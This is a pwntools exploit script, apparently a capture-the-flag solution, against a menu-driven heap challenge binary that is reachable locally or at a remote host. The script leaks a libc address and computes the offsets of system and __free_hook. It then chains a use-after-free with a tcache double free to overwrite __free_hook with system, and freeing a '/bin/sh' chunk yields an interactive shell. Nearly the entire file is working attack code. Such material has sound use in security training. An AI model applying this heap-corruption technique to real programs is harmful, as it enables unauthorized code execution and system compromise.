from pwn import *

def malloc(r, sze, input):
    # Choice
    r.recvuntil('> ')
    r.sendline(b'1')

    # Size
    r.recvuntil(': ')
    r.sendline(sze)

    # input
    r.recvuntil(': ')
    r.send(input)

def free(r, idx):
    # Choice
    r.recvuntil('> ')
    r.sendline(b'2')

    # Index
    r.recvuntil(': ')
    r.sendline(idx)

def edit(r, idx, input):
    # Choice
    r.recvuntil('> ')
    r.sendline(b'3')

    # Index
    r.recvuntil(': ')
    r.sendline(idx)

    # input
    r.recvuntil(': ')
    r.send(input)

def exploit(ReorNOT):
    # context.log_level = 'debug'
    if(ReorNOT == True):
        r = remote('rivit.dev', 10024)
    else:
        binary = context.binary = ELF('./task', checksec=False)
        r = process()

    r.recvuntil('0x')
    puts_leak = int(r.recv(12).decode().strip(), 16)
    system_addr = puts_leak - 0x32190
    malloc_addr = puts_leak + 0x15cc0
    malloc_hook_addr = puts_leak + 0x1645d0

    free_addr = puts_leak + 0x162b0
    free_hook_addr = puts_leak + 0x167588

    log.info(f'Address of puts() {hex(puts_leak)}')
    log.info(f'Address of system() {hex(system_addr)}')
    log.info(f'Address of malloc() {hex(malloc_addr)}')
    log.info(f'Address of free() {hex(free_addr)}')
    log.info(f'Address of __malloc_hook() {hex(malloc_hook_addr)}')
    log.info(f'Address of __free_hook() {hex(free_hook_addr)}')

    malloc(r, b'24', b'A')
    malloc(r, b'24', b'B')
    # malloc(r, b'16', b'B')
    
    free(r, b'0')
    free(r, b'1')
    # free(r, b'2')
    
    # r.interactive()

    # UAF + Double Free
    edit(r, b'1', b'A'*9)                  # Overwrite the tcache's key
    free(r, b'1')
    # # edit(r, b'1', b'\xa0')

    # # r.interactive()
    # Overwrite the FD pointer of the chunk
    malloc(r, b'24', p64(free_hook_addr))
    malloc(r, b'24', b'/bin/sh')

    # r.interactive()

    # # Overwrite the free() with system()
    malloc(r, b'24', p64(system_addr))

    free(r, b'3')
    r.interactive()

exploit(False)